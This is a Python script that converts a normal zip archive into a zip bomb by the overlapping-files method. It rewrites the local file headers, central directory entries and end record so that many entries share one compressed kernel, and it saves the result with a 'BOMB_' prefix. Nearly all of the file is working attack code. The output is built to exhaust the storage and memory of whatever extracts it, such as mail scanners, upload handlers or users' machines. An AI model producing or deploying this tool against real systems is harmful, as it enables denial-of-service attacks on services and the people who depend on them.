"""
This script provides fucntionality for turning an innocent zip into a zipbomb
with the overlapped files method.
Call it like so:

    python3 bombifier.py path.zip count

where "path.zip" is the path to your zip and "count" is the number of files
you want to add to the zip.
"""


import os
import sys

from copy import deepcopy


FILE_HEADER_SIZE = 31   # we assume 1 byte file name and no extras
CENTRAL_DIR_HEADER_SIZE = 47
EOCDR_SIZE = 22

FILE_HEADER_STRUCTURE = {
    "signature":        (0, 4),
    "extract_ver":      (4, 2),
    "bitflag":          (6, 2),
    "compres_meth":     (8, 2),
    "last_mod_time":    (10, 2),
    "last_mod_date":    (12, 2),
    "crc32":            (14, 4),
    "compres_size":     (18, 4),
    "uncompres_size":   (22, 4),
    "filename_len":     (26, 2),
    "extra_len":        (28, 2),
    "filename":         (30, 1),
    "extra":            (31, 0)
}

CENTRAL_DIR_HEADER_STRUCTURE = {
    "signature":            (0, 4),
    "compres_ver":          (4, 2),
    "extract_ver":          (6, 2),
    "bitflag":              (8, 2),
    "compres_meth":         (10, 2),
    "last_mod_time":        (12, 2),
    "last_mod_date":        (14, 2),
    "crc32":                (16, 4),
    "compres_size":         (20, 4),
    "uncompres_size":       (24, 4),
    "filename_len":         (28, 2),
    "extra_len":            (30, 2),
    "comment_len":          (32, 2),
    "disk_no":              (34, 2),
    "internal_attr":        (36, 2),
    "external_attr":        (38, 4),
    "file_header_offset":   (42, 4),
    "filename":             (46, 1),
    "extra":                (47, 0),
    "comment":              (47, 0)
}

EOCDR_STRUCTURE = {
    "signature":        (0, 4),
    "disk_no":          (4, 2),
    "start_disk":       (6, 2),
    "cdir_no":          (8, 2),
    "cdir_no_total":    (10, 2),
    "cdir_size":        (12, 4),
    "cdir_start":       (16, 4),
    "comment_len":      (20, 2),
    "comment":          (22, 0)
}

QUOTE = b"\x00\x1f\x00\xe0\xff" # 0 | FILE_HEADER_LEN{2} | 0xffff XOR FILE_HEADER_LEN{2}


def process_section(section, model):
    """
    Turn a bytestring section of a zip file into a dictionary

    @param section: bytes of the zip section to be processed
    @param model: a dict containing the values expected in the section,
                  their starting offsets and sizes
    @return: a dict with the same keys as model
             and values as corresponding bytes from section
    """
    print("Section:", section, "\n")

    structure = {}
    for key, (start, size) in model.items():
        structure[key] = section[start : (start + size)]
    
    print("Processed section:", structure, "\n")
    return structure


def dump(structure, model):
    """
    Turn a structured section of a zip file into a bytestring

    @param structure: dict representing a section of a zip file
    @param model: a dict containing the values expected in the section,
                  their starting offsets and sizes
    @return: the values in the structure concatenated in the order given by the model
    """
    data = [(model[key][0], value) for key, value in structure.items()]
    data.sort(key=lambda x: x[0])

    dump_data = b""
    for _, value in data:
        dump_data += value
    return dump_data


def add_overlap(file_headers, central_dir_headers, eocdr):
    """
    Add one overlapping file.
    Both the new file header and the new central directory header are
    placed at the start of their corresponding sequence. 
    """
    # new file header
    file_header = deepcopy(file_headers[0])

    file_header["filename"] = bytes([ord(file_header["filename"]) + 1])

    file_header["compres_size"] = \
        (int.from_bytes(file_header["compres_size"], "little") + FILE_HEADER_SIZE + len(QUOTE)) \
        .to_bytes(4, "little")

    file_header["uncompres_size"] = \
        (int.from_bytes(file_header["uncompres_size"], "little") + FILE_HEADER_SIZE + len(QUOTE)) \
        .to_bytes(4, "little")

    # new central dir header
    central_dir_header = deepcopy(central_dir_headers[0])

    central_dir_header["filename"] = file_header["filename"]

    central_dir_header["compres_size"] = file_header["compres_size"]

    central_dir_header["uncompres_size"] = file_header["uncompres_size"]

    for cdh in central_dir_headers:
        cdh["file_header_offset"] = \
            (int.from_bytes(cdh["file_header_offset"], "little") + FILE_HEADER_SIZE + len(QUOTE)) \
            .to_bytes(4, "little")

    # updated eocdr
    eocdr["cdir_no"] = (int.from_bytes(eocdr["cdir_no"], "little") + 1).to_bytes(2, "little")
    eocdr["cdir_no_total"] = eocdr["cdir_no"]

    eocdr["cdir_size"] = \
        (int.from_bytes(eocdr["cdir_size"], "little") + CENTRAL_DIR_HEADER_SIZE).to_bytes(4, "little")

    eocdr["cdir_start"] = \
        (int.from_bytes(eocdr["cdir_start"], "little") + FILE_HEADER_SIZE + len(QUOTE)).to_bytes(4, "little")

    return [file_header] + file_headers, [central_dir_header] + central_dir_headers, eocdr


def process_zip(zip):
    """
    Take a bytestring representation of a zip file and convert it to a more useful representation:
        * List of dicts for file headers
        * Kernel as is
        * List of dicts for central directory headers
        * Dict for end of central directory record
    """
    file_count = (len(zip) - EOCDR_SIZE - FILE_HEADER_SIZE - CENTRAL_DIR_HEADER_SIZE) \
              // (FILE_HEADER_SIZE + len(QUOTE) + CENTRAL_DIR_HEADER_SIZE) + 1

    # file headers
    file_headers = [process_section(zip[:FILE_HEADER_SIZE], FILE_HEADER_STRUCTURE)]
    for i in range(1, file_count):
        processed_count = i * (FILE_HEADER_SIZE + len(QUOTE))

        file_headers.append(process_section(
            zip[processed_count : processed_count + FILE_HEADER_SIZE],
            FILE_HEADER_STRUCTURE))
    
    # kernel
    kernel = zip[file_count * (FILE_HEADER_SIZE + len(QUOTE)) - len(QUOTE)
                 : - (EOCDR_SIZE + file_count * CENTRAL_DIR_HEADER_SIZE)]

    # central dir headers
    central_dir_headers = []
    for i in range(file_count):
        processed_count = len(zip) - EOCDR_SIZE - (file_count - i) * CENTRAL_DIR_HEADER_SIZE

        central_dir_headers.append(process_section(
            zip[processed_count : processed_count + CENTRAL_DIR_HEADER_SIZE],
            CENTRAL_DIR_HEADER_STRUCTURE))

    # eocdr
    eocdr = process_section(zip[-EOCDR_SIZE:], EOCDR_STRUCTURE)

    return file_headers, kernel, central_dir_headers, eocdr


def build_zip(file_headers, kernel, central_dir_headers, eocdr):
    """
    With the pieces provied, build a bytesting representation of a zip
    """
    zip = b""

    for file_header in file_headers:
        zip += dump(file_header, FILE_HEADER_STRUCTURE)
        zip += QUOTE
    zip = zip[:-len(QUOTE)]

    zip += kernel

    for central_dir_header in central_dir_headers:
        zip += dump(central_dir_header, CENTRAL_DIR_HEADER_STRUCTURE)
    
    zip += dump(eocdr,EOCDR_STRUCTURE)

    return zip


def bombify(zip_name, count=0):
    """
    Turn a zip into a bomb.
    The bomb will be stored in a new file, prefixed with "BOMB_".

    @param count: How many files are to be added to the zip
    """
    print("Bombifying", zip_name, "\n")

    with open(zip_name, "rb") as zip_file:
        zip = zip_file.read()

    bomb_name = "BOMB_" + zip_name
    with open(bomb_name, "wb") as bomb_file:
        bomb_file.write(zip)

    for _ in range(count):
        with open(bomb_name, "rb") as zip_file:
            zip = zip_file.read()
        print("Zip dump:", zip, "\n")

        file_headers, kernel, central_dir_headers, eocdr = process_zip(zip)
        print("Processed file headers:", file_headers)
        print("Processed central dir headers:", central_dir_headers)
        print("Processed eocdr:", eocdr)

        file_headers, central_dir_headers, eocdr = add_overlap(file_headers, central_dir_headers, eocdr)
        bomb = build_zip(file_headers, kernel, central_dir_headers, eocdr)
        print("Bomb:", bomb, "\n")

        with open("BOMB_" + zip_name, "wb") as bomb_file:
            bomb_file.write(bomb)


if __name__ == "__main__":
    bombify(sys.argv[1], int(sys.argv[2]))
